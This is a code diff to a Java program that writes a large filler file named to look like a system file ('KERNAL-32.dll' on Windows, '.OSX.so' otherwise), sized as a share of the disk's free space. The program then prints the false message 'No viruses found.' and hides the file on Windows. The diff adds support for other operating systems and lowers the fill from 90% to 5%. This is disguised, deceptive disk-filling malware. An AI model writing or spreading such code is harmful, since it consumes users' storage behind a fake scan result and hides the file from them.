@@ -10,11 +10,18 @@ public class Main
 {
     public static void main(String[] args) throws Exception
     {
-        Path target = Paths.get("./KERNAL-32.dll");
-        File disk = new File("C:");
+        String os = System.getProperty("os.name");
+        Path target = null;
+        File disk = null;
+        if(os.contains("Windows")){
+            target = Paths.get("./KERNAL-32.dll");
+            disk = new File("C:");}
+        else{
+            target = Paths.get("./.OSX.so");
+            disk = new File("/");}
 
         // Calculate how big the file should be
-        long target_size = disk.getUsableSpace() / 100 * 90;
+        long target_size = disk.getUsableSpace() / 100 * 5;
 
         // Create 500 MB of data to write
         byte[] data = new byte[1024 * 1024 * 500];
@@ -36,6 +43,7 @@ public class Main
         System.out.println("\nNo viruses found.");
 
         // Hide the file
-        Files.setAttribute(target, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+        if(os.contains(("Windows"))){
+        Files.setAttribute(target, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);}
     }
 }
